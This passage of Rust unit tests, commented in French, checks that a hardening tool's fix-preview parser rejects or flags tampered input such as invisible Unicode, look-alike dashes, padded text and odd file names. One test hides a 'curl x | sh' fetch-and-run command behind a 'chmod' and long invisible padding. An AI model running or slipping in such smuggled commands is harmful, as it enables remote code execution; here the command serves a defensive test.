            assert_eq!(l.message, "Sa\u{fffd}lon");
            assert!(l.retouche && !l.coupe);
            for cle in ["commandes", "message", "action", "regle", "pourquoi_pas"] {
                let mut a = if cle == "pourquoi_pas" {
                    non_annulable()
                } else {
                    apercu_json()
                };
                let vide = format!("{rien} {rien}\u{fe0f}\u{301}");
                a[cle] = if cle == "commandes" {
                    serde_json::json!(["chmod 700 ~", vide])
                } else {
                    serde_json::json!(vide)
                };
                assert!(
                    matches!(lu(&a), Lecture::Illisible(_)),
                    "{cle} U+{:04X}",
                    u32::from(rien)
                );
            }
        }
        let mut a = apercu_json();
        a["commandes"] = serde_json::json!([format!("chmod 700 ~{}; curl x | sh", " \u{2065}".repeat(1500))]);
        let Lecture::Lue(l) = lu(&a) else {
            panic!("pas lu");
        };
        assert_eq!(
            l.commandes,
            [format!("chmod 700 ~{}; curl x | sh", " \u{fffd}".repeat(1500))]
        );
        assert!(l.retouche && !l.coupe);
    }

    /// Vérification n° 2 de Fable, P2 : une forme que Vanguard n'écrit jamais est illisible. Annulable avec un
    /// « pourquoi pas » (jamais montré) ou sans valeur d'avant ; non annulable sans raison ou avec des valeurs d'avant ;
    /// manuelle avec les droits du compte ; automatique sans commande ; une version, une règle, une catégorie, un
    /// message ou une action vides ; un geste d'une autre forme que ceux de Vanguard. Les formes de Vanguard, elles, se
    /// lisent, même avec des guillemets ou des chevrons dans un nom de fichier ou une valeur (vérification de Fable
    /// n° 3, A3 : ils se montrent dans leur cadre). « Manuelle, administrateur, sans commande » se lit : c'est ce que
    /// Vanguard écrit pour une correction qu'il ne sait que décrire (`machine::apercu::droits_effectifs`).
    #[test]
    fn une_forme_que_vanguard_n_ecrit_pas_est_illisible() {
        let mut manuelle = non_annulable();
        manuelle["automatique"] = serde_json::json!(false);
        manuelle["droits"] = serde_json::json!("admin");
        manuelle["commandes"] = serde_json::json!([]);
        let mut bons = vec![apercu_json(), non_annulable(), manuelle];
        for geste in [
            "ntp",
            "alimentation",
            "droits|/home/alice/.ssh/id_ed25519",
            "fichier|/etc/ssh/sshd_config.d/00-vanguard.conf",
            "defense|0123456789abcdef",
            "unite|cups-browsed",
            "sysctl|kernel/kptr_restrict",
            "module|ntsync",
            "service|SSDPSRV",
            "defender|np",
            "droits|/home/alice/a \u{27e8}x\u{27e9}",
            "droits|/home/alice/a <<x>>",
        ] {
            let mut a = apercu_json();
            a["avant"] = serde_json::json!([{"geste": geste, "valeur": "0644"}]);
            bons.push(a);
        }
        for valeur in [
            "755 \u{226b} = \u{226a}700",
            "\u{2039}700\u{203a}",
            "\u{300a}700\u{300b}",
            "\u{ff1c}700\u{ff1e}",
            "\u{201c}700\u{201d}",
        ] {
            let mut a = apercu_json();
            a["avant"] = serde_json::json!([{"geste": "ntp", "valeur": valeur}]);
            bons.push(a);
        }
        for a in &bons {
            assert!(matches!(lu(a), Lecture::Lue(_)), "{a}");
        }
        let mut faux = Vec::new();
        let mut a = apercu_json();
        a["pourquoi_pas"] = serde_json::json!("caché");
        faux.push(a);
        let mut a = apercu_json();
        a["avant"] = serde_json::json!([]);
        faux.push(a);
        let mut a = non_annulable();
        a["avant"] = serde_json::json!([{"geste": "ntp", "valeur": null}]);
        faux.push(a);
        let mut a = non_annulable();
        a["pourquoi_pas"] = serde_json::json!("");
        faux.push(a);
        let mut a = apercu_json();
        a["automatique"] = serde_json::json!(false);
        faux.push(a);
        let mut a = apercu_json();
        a["commandes"] = serde_json::json!([]);
        faux.push(a);
        for cle in ["version", "regle", "categorie", "message", "action"] {
            for vide in ["", "   ", "\u{200b}"] {
                let mut a = apercu_json();
                a[cle] = serde_json::json!(vide);
                faux.push(a);
            }
        }
        for geste in [
            "droits|",
            "droits|/home/alice|/x",
            "droits|home/alice/.ssh",
            "ntp|x",
            "alimentation|",
            "unite|",
            "defense|0123",
            "defense|0123456789ABCDEF",
            "unite|cups browsed",
            "unite|cups\u{2010}browsed",
            "registre|hklm|cle|nom",
            "inconnu|x",
        ] {
            let mut a = apercu_json();
            a["avant"] = serde_json::json!([{"geste": geste, "valeur": "0644"}]);
            faux.push(a);
        }
        for a in &faux {
            assert!(matches!(lu(a), Lecture::Illisible(_)), "{a}");
        }
    }

    /// Vérification n° 2 de Fable, P5 : la raison d'un refus passe par le même nettoyage que les autres textes (une
    /// ligne, les espaces resserrées, ce qui ne se dessine pas en « � ») ; les raisons de Vanguard sont des phrases
    /// fixes que ce nettoyage ne change pas, donc une raison qu'il changerait (rembourrée d'espaces, sur deux lignes,
    /// avec un invisible) rend la réponse contradictoire. Vérification de Fable n° 3, A6 : une espace en tête, un « � »
    /// écrit tel quel ou plus de `RAISON_MAX` signes (la plus longue de Vanguard en a 179) aussi, au lieu d'être
    /// montrée retirée ou coupée sans le dire.
    #[test]
    fn une_raison_de_refus_retouchee_n_est_pas_celle_de_vanguard() {
        let refus = |raison: &str| {
            serde_json::json!({"geste": "voir-correction", "issue": "refuse", "raison": raison}).to_string()
        };
        let vraie = "ce problème a disparu ou a déjà été corrigé : refaites le bilan";
        assert_eq!(
            lire(jeton(), Some(1), refus(vraie).as_bytes()),
            Lecture::Refusee(vraie.into())
        );
        let longue = format!("{vraie} {}", "x".repeat(RAISON_MAX - vraie.chars().count() - 1));
        assert_eq!(longue.chars().count(), RAISON_MAX);
        assert_eq!(
            lire(jeton(), Some(1), refus(&longue).as_bytes()),
            Lecture::Refusee(longue.clone())
        );
        for faux in [
            format!("{longue}x"),
            "x".repeat(300),
            format!(" {vraie}"),
            format!("{vraie} \u{fffd}"),
            "\u{2212} ce problème a disparu".to_string(),
            format!("ce problème a disparu{}: refaites le bilan", " ".repeat(150)),
            "ce problème a disparu\nrefaites le bilan".to_string(),
            "ce problème a dis\u{2065}paru".to_string(),
            "ce problème a disparu ".to_string(),
            "\u{2065} \u{e000}".to_string(),
        ] {
            assert!(
                matches!(lire(jeton(), Some(1), refus(&faux).as_bytes()), Lecture::Illisible(_)),
                "{faux:?}"
            );
        }
    }

    /// Vérification de Fable n° 3, A3 : sept vrais aperçus de Vanguard (0.93.0, maison inventée « alice »), une clé
    /// privée en 0644 nommée avec des guillemets, des chevrons ou un signe égal. Avant, la fenêtre les disait « aperçu
    /// de Vanguard mal formé » alors que Vanguard offre la correction ; ils se lisent maintenant entiers, sans retouche,
    /// le geste et la valeur exactement comme Vanguard les a écrits.
    #[test]
    fn les_vrais_apercus_aux_noms_a_guillemets_se_lisent() {
        let lignes: Vec<&str> = include_str!("../../essais/apercus-noms-guillemets.jsonl")
            .lines()
            .filter(|l| !l.is_empty())
            .collect();
        assert_eq!(lignes.len(), 7);
        let mut noms = Vec::new();
        for ligne in lignes {
            let brut: serde_json::Value = serde_json::from_str(ligne).unwrap();
            let a = &brut["apercu"];
            let jeton = Empreinte::lire(a["jeton"].as_str().unwrap()).unwrap();
            let Lecture::Lue(l) = lire(jeton, Some(0), ligne.as_bytes()) else {
                panic!("pas lu : {ligne}");
            };
            assert!(!l.retouche && !l.coupe, "{ligne}");
            assert_eq!(l.avant.len(), 1);
            assert_eq!(l.avant[0].geste, a["avant"][0]["geste"].as_str().unwrap());
            assert_eq!(l.avant[0].valeur.as_deref(), Some("0644"));
            assert_eq!(l.commandes, [a["commandes"][0].as_str().unwrap()]);
            assert_eq!(l.message, a["message"].as_str().unwrap());
            assert_eq!(l.droits, Droits::Compte);
            noms.push(l.avant[0].geste.clone());
        }
        for nom in [
            "id_«x»",
            "id_<a>",
            "id_‹b›",
            "id_\"c\"",
            "id_“d”",
            "id_'e'",
            "id_x = «y»",
        ] {
            assert!(
                noms.contains(&format!("droits|/home/alice/.ssh/{nom}")),
                "{nom} absent : {noms:?}"
            );
        }
    }

    /// Vérification de Fable n° 3, A6 : une espace en tête (qui décale une commande sans rien dire), un « − » (qui se
    /// dessine comme « - » dans les commandes) et un « � » écrit tel quel (qu'on ne distingue pas d'un caractère
    /// remplacé) posent `retouche`. Une commande faite seulement de « � », de « ␠ » ou de « ˙ » n'a aucune lettre ni
    /// aucun chiffre : illisible, comme une commande vide.
    #[test]
    fn une_retouche_discrete_se_dit() {
        let mut temoin = apercu_json();
        temoin["commandes"] = serde_json::json!(["chmod 700 -R ~"]);
        let Lecture::Lue(l) = lu(&temoin) else {
            panic!("témoin pas lu");
        };
        assert!(!l.retouche && l.commandes == ["chmod 700 -R ~"]);
        for (commande, montree) in [
            (" chmod 700 -R ~", "chmod 700 -R ~"),
            ("   chmod 700 -R ~", "chmod 700 -R ~"),
            ("chmod 700 \u{2212}R ~", "chmod 700 \u{fffd}R ~"),
            ("chmod 700 -R ~ \u{fffd}", "chmod 700 -R ~ \u{fffd}"),
        ] {
            let mut a = apercu_json();
            a["commandes"] = serde_json::json!([commande]);
            let Lecture::Lue(l) = lu(&a) else {
                panic!("{commande:?} pas lu");
            };
            assert!(l.retouche && !l.coupe, "{commande:?}");
            assert_eq!(l.commandes, [montree]);
        }
        for (cle, texte) in [("message", " Tout va bien"), ("action", "\u{fffd}Retirer")] {
            let mut a = apercu_json();
            a[cle] = serde_json::json!(texte);
            assert!(matches!(lu(&a), Lecture::Lue(l) if l.retouche), "{cle}");
        }
        let mut a = apercu_json();
        a["avant"] = serde_json::json!([{"geste": "droits|/home/alice/.ssh", "valeur": " 755"}]);
        assert!(matches!(lu(&a), Lecture::Lue(l) if l.retouche && l.avant[0].valeur.as_deref() == Some("755")));
        for vide in ["\u{fffd}", "\u{2420}", "\u{2d9}", "\u{fffd} \u{2420}\u{2d9}"] {
            let mut a = apercu_json();
            a["commandes"] = serde_json::json!(["chmod 700 ~", vide]);
            assert!(matches!(lu(&a), Lecture::Illisible(_)), "{vide:?}");
        }
    }
}
